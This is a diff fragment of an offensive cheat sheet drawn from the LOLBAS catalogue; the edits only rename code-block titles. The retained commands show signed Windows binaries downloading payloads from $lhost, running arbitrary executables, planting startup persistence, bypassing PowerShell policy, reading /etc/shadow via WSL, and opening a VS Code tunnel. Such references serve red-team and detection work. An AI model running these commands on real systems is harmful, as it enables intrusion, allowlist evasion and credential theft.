+```cmd title:"Lolbas The above binary will go to url and look for RELEASES file and download the nuget package"
 Update.exe --download $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -7543,7 +7543,7 @@ The above binary will go to url and look for RELEASES file, download and install
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"The above binary will go to url and look for RELEASES file, download and install the nuget package"
+```cmd title:"Lolbas The above binary will go to url and look for RELEASES file, download and install the nuget package"
 Update.exe --update=$scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -7559,7 +7559,7 @@ The above binary will go to url and look for RELEASES file, download and install
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"The above binary will go to url and look for RELEASES file, download and install the nuget package"
+```cmd title:"Lolbas The above binary will go to url and look for RELEASES file, download and install the nuget package"
 Update.exe --update=$scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -7575,7 +7575,7 @@ The above binary will go to url and look for RELEASES file, download and install
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"The above binary will go to url and look for RELEASES file, download and install the nuget package…"
+```cmd title:"Lolbas Update.exe AWL Bypass #4"
 Update.exe --update=\\$lhost\$share\$file
 ```
 <!-- cheat
@@ -7590,7 +7590,7 @@ The above binary will go to url and look for RELEASES file, download and install
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"The above binary will go to url and look for RELEASES file, download and install the nuget package…"
+```cmd title:"Lolbas Update.exe Execute #5"
 Update.exe --update=\\$lhost\$share\$file
 ```
 <!-- cheat
@@ -7605,7 +7605,7 @@ The above binary will go to url and look for RELEASES file, download and install
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"The above binary will go to url and look for RELEASES file, download and install the nuget package"
+```cmd title:"Lolbas The above binary will go to url and look for RELEASES file, download and install the nuget package"
 Update.exe --updateRollback=$scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -7621,7 +7621,7 @@ The above binary will go to url and look for RELEASES file, download and install
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"The above binary will go to url and look for RELEASES file, download and install the nuget package"
+```cmd title:"Lolbas The above binary will go to url and look for RELEASES file, download and install the nuget package"
 Update.exe --updateRollback=$scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -7637,7 +7637,7 @@ Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. The
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\"
+```cmd title:"Lolbas Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\"
 Update.exe --processStart $file_out --process-start-args "$cmd"
 ```
 <!-- cheat
@@ -7651,7 +7651,7 @@ The above binary will go to url and look for RELEASES file, download and install
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"The above binary will go to url and look for RELEASES file, download and install the nuget package…"
+```cmd title:"Lolbas Update.exe AWL Bypass #9"
 Update.exe --updateRollback=\\$lhost\$share\$file
 ```
 <!-- cheat
@@ -7666,7 +7666,7 @@ The above binary will go to url and look for RELEASES file, download and install
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"The above binary will go to url and look for RELEASES file, download and install the nuget package…"
+```cmd title:"Lolbas Update.exe Execute #10"
 Update.exe --updateRollback=\\$lhost\$share\$file
 ```
 <!-- cheat
@@ -7681,7 +7681,7 @@ Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. The
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\"
+```cmd title:"Lolbas Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\"
 Update.exe --processStart $file_out --process-start-args "$cmd"
 ```
 <!-- cheat
@@ -7695,7 +7695,7 @@ Copy your payload into "%localappdata%\Microsoft\Teams\current\". Then run the c
 
 *Privileges: User • MITRE: T1547*
 
-```cmd title:"Copy your payload into '%localappdata%\Microsoft\Teams\current\'"
+```cmd title:"Lolbas Copy your payload into '%localappdata%\Microsoft\Teams\current\'"
 Update.exe --createShortcut=$file_out -l=Startup
 ```
 <!-- cheat
@@ -7708,7 +7708,7 @@ Run the command to remove the shortcut created in the "%appdata%\Microsoft\Windo
 
 *Privileges: User • MITRE: T1070*
 
-```cmd title:"Run the command to remove the shortcut created in the '%appdata%\Microsoft\Windows\Start…"
+```cmd title:"Lolbas Update.exe Execute #13"
 Update.exe --removeShortcut=$file_out-l=Startup
 ```
 <!-- cheat
@@ -7739,7 +7739,7 @@ Downloads payload from remote server
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Downloads payload from remote server"
+```cmd title:"Lolbas Downloads payload from remote server"
 Visio.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -7764,7 +7764,7 @@ Generate Serialized gadget and save to - `C:\Users\%USERNAME%\AppData\Roaminguiv
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Generate Serialized gadget and save to - C:\Users\%USERNAME%\AppData\Roaminguiverify.config before…"
+```cmd title:"Lolbas VisualUiaVerifyNative.exe AWL Bypass"
 VisualUiaVerifyNative.exe
 ```
 <!-- cheat
@@ -7783,7 +7783,7 @@ Starts a collection session with sessionID 1 and calls kernelbase.CreateProcessW
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Starts a collection session with sessionID 1 and calls kernelbase.CreateProcessW to launch…"
+```cmd title:"Lolbas VSDiagnostics.exe Execute #1"
 VSDiagnostics.exe start 1 /launch:$file_out
 ```
 <!-- cheat
@@ -7796,7 +7796,7 @@ Starts a collection session with sessionID 2 and calls kernelbase.CreateProcessW
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Starts a collection session with sessionID 2 and calls kernelbase.CreateProcessW to launch…"
+```cmd title:"Lolbas VSDiagnostics.exe Execute #2"
 VSDiagnostics.exe start 2 /launch:$file_out /launchArgs:"$cmd"
 ```
 <!-- cheat
@@ -7817,7 +7817,7 @@ Executes specified executable from vshadow.exe.
 
 *Privileges: Administrator • MITRE: T1202*
 
-```cmd title:"Executes specified executable from vshadow.exe"
+```cmd title:"Lolbas Executes specified executable from vshadow.exe"
 vshadow.exe -nw -exec=$file_out C:
 ```
 <!-- cheat
@@ -7837,7 +7837,7 @@ The above binary will execute other binary.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"The above binary will execute other binary"
+```cmd title:"Lolbas The above binary will execute other binary"
 VSIISExeLauncher.exe -p $file_out -a "$cmd"
 ```
 <!-- cheat
@@ -7858,7 +7858,7 @@ Executes specified executable as a subprocess of Vsjitdebugger.exe.
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Executes specified executable as a subprocess of Vsjitdebugger.exe"
+```cmd title:"Lolbas Executes specified executable as a subprocess of Vsjitdebugger.exe"
 Vsjitdebugger.exe $file_out
 ```
 <!-- cheat
@@ -7879,7 +7879,7 @@ Download and execute payload from remote server
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Download and execute payload from remote server"
+```cmd title:"Lolbas Download and execute payload from remote server"
 VSLaunchBrowser.exe .exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -7895,7 +7895,7 @@ Execute payload via VSLaunchBrowser as parent process
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Execute payload via VSLaunchBrowser as parent process"
+```cmd title:"Lolbas Execute payload via VSLaunchBrowser as parent process"
 VSLaunchBrowser.exe .exe $file_out
 ```
 <!-- cheat
@@ -7908,7 +7908,7 @@ Execute payload from WebDAV server via VSLaunchBrowser as parent process
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Execute payload from WebDAV server via VSLaunchBrowser as parent process"
+```cmd title:"Lolbas Execute payload from WebDAV server via VSLaunchBrowser as parent process"
 VSLaunchBrowser.exe .exe \\$lhost\$share\$file
 ```
 <!-- cheat
@@ -7930,7 +7930,7 @@ Load a library payload using the --agentExtensionPath parameter (32-bit)
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Load a library payload using the --agentExtensionPath parameter (32-bit)"
+```cmd title:"Lolbas Load a library payload using the --agentExtensionPath parameter (32-bit)"
 vsls-agent.exe --agentExtensionPath $file_out
 ```
 <!-- cheat
@@ -7951,7 +7951,7 @@ VSTest functionality may allow an adversary to executes their malware by wrappin
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"VSTest functionality may allow an adversary to executes their malware by wrapping it as a test…"
+```cmd title:"Lolbas vstest.console.exe AWL Bypass"
 vstest.console.exe $file_out
 ```
 <!-- cheat
@@ -7971,7 +7971,7 @@ Execute arbitrary C# code embedded in a XOML file.
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Execute arbitrary C# code embedded in a XOML file"
+```cmd title:"Lolbas Execute arbitrary C# code embedded in a XOML file"
 wfc.exe $file_out
 ```
 <!-- cheat
@@ -7991,7 +7991,7 @@ Executes the file `tracerpt.exe` in the same folder as `WFMFormat.exe`. If the f
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Executes the file tracerpt.exe in the same folder as WFMFormat.exe"
+```cmd title:"Lolbas Executes the file tracerpt.exe in the same folder as WFMFormat.exe"
 WFMFormat.exe
 ```
 <!-- cheat
@@ -8013,7 +8013,7 @@ Launches a command line through the debugging process; optionally add `-G` to ex
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Launches a command line through the debugging process; optionally add -G to exit the debugger…"
+```cmd title:"Lolbas WinDbg.exe Execute"
 windbg.exe -g $cmd
 ```
 <!-- cheat
@@ -8037,7 +8037,7 @@ Execute an executable file with WinFile as a parent process.
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Execute an executable file with WinFile as a parent process"
+```cmd title:"Lolbas Execute an executable file with WinFile as a parent process"
 winfile.exe $file_out
 ```
 <!-- cheat
@@ -8068,7 +8068,7 @@ Downloads payload from remote server
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Downloads payload from remote server"
+```cmd title:"Lolbas Downloads payload from remote server"
 WinProj.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -8106,7 +8106,7 @@ Downloads payload from remote server
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Downloads payload from remote server"
+```cmd title:"Lolbas Downloads payload from remote server"
 winword.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -8129,7 +8129,7 @@ Executes calc.exe from wsl.exe
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Executes calc.exe from wsl.exe"
+```cmd title:"Lolbas Executes calc.exe from wsl.exe"
 wsl.exe -e /mnt/c/Windows/System32/calc.exe
 ```
 <!-- cheat
@@ -8141,7 +8141,7 @@ Cats /etc/shadow file as root
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Cats /etc/shadow file as root"
+```cmd title:"Lolbas Cats /etc/shadow file as root"
 wsl.exe -u root -e cat /etc/shadow
 ```
 <!-- cheat
@@ -8153,7 +8153,7 @@ Executes Linux command (for example via bash) as the default user (unless stated
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Executes Linux command (for example via bash) as the default user (unless stated otherwise using -u…"
+```cmd title:"Lolbas Execute Linux command through WSL"
 wsl.exe --exec bash -c "$cmd"
 ```
 <!-- cheat
@@ -8166,7 +8166,7 @@ Downloads file from $lhost
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Downloads file from 192.168.1.10"
+```cmd title:"Lolbas Downloads file from 192.168.1.10"
 wsl.exe --exec bash -c 'cat < /dev/tcp/$lhost/54 > binary'
 ```
 <!-- cheat
@@ -8179,7 +8179,7 @@ When executed, `wsl.exe` queries the registry value of `HKLM\SOFTWARE\Microsoft\
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"When executed, wsl.exe queries the registry value of…"
+```cmd title:"Lolbas Wsl.exe Execute #5"
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation" /ve /d "$file_in" /f
 wsl.exe
 ```
@@ -8201,7 +8201,7 @@ Executes an executable after the trace is complete using the callBack parameter.
 
 *Privileges: Administrator • MITRE: T1202*
 
-```cmd title:"Executes an executable after the trace is complete using the callBack parameter"
+```cmd title:"Lolbas Executes an executable after the trace is complete using the callBack parameter"
 xbootmgr.exe -trace "$boot_hibernate_standby_shutdown_rebootcycle" -callBack $file_out
 ```
 <!-- cheat
@@ -8215,7 +8215,7 @@ Executes an executable before each trace run using the preTraceCmd parameter.
 
 *Privileges: Administrator • MITRE: T1202*
 
-```cmd title:"Executes an executable before each trace run using the preTraceCmd parameter"
+```cmd title:"Lolbas Executes an executable before each trace run using the preTraceCmd parameter"
 xbootmgr.exe -trace "$boot_hibernate_standby_shutdown_rebootcycle" -preTraceCmd $file_out
 ```
 <!-- cheat
@@ -8237,7 +8237,7 @@ Execute executable via XBootMgrSleep, with a 1 second (=1000 milliseconds) delay
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Execute executable via XBootMgrSleep, with a 1 second (=1000 milliseconds) delay"
+```cmd title:"Lolbas Execute executable via XBootMgrSleep, with a 1 second (=1000 milliseconds) delay"
 xbootmgrsleep.exe 1000 $file_out
 ```
 <!-- cheat
@@ -8257,7 +8257,7 @@ Downloads payload from remote server
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Downloads payload from remote server"
+```cmd title:"Lolbas Downloads payload from remote server"
 xsd.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -8284,7 +8284,7 @@ Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.
 
 *Privileges: User • MITRE: T1219.001*
 
-```cmd title:"Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.com via websockets;…"
+```cmd title:"Lolbas code.exe Execute"
 code.exe tunnel --accept-server-license-terms --name "tunnel-name"
 ```
 <!-- cheat
@@ -8458,7 +8458,7 @@ GfxDownloadWrapper.exe downloads the content that returns URL and writes it to t
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"GfxDownloadWrapper.exe downloads the content that returns URL and writes it to the file DESTINATION…"
+```cmd title:"Lolbas GfxDownloadWrapper.exe Download"
 C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe "$scheme://$lhost:$lport/$file" "$file_out"
 ```
 <!-- cheat
@@ -8483,7 +8483,7 @@ Set the execution policy to bypass and execute a PowerShell script without warni
 
 *Privileges: User • MITRE: T1059.001*
 
-```cmd title:"Set the execution policy to bypass and execute a PowerShell script without warning"
+```cmd title:"Lolbas Set the execution policy to bypass and execute a PowerShell script without warning"
 powershell.exe -ep bypass -file $file_in
 ```
 <!-- cheat
@@ -8496,7 +8496,7 @@ Set the execution policy to bypass and execute a PowerShell command
 
 *Privileges: User • MITRE: T1059.001*
 
-```cmd title:"Set the execution policy to bypass and execute a PowerShell command"
+```cmd title:"Lolbas Set the execution policy to bypass and execute a PowerShell command"
 powershell.exe -ep bypass -command "$cmd"
 ```
 <!-- cheat
@@ -8509,7 +8509,7 @@ Set the execution policy to bypass and execute a very malicious PowerShell encod
 
 *Privileges: User • MITRE: T1059.001*
 
-```cmd title:"Set the execution policy to bypass and execute a very malicious PowerShell encoded command"
+```cmd title:"Lolbas Set the execution policy to bypass and execute a very malicious PowerShell encoded command"
 powershell.exe -ep bypass -ec $payload_b64
 ```
 <!-- cheat
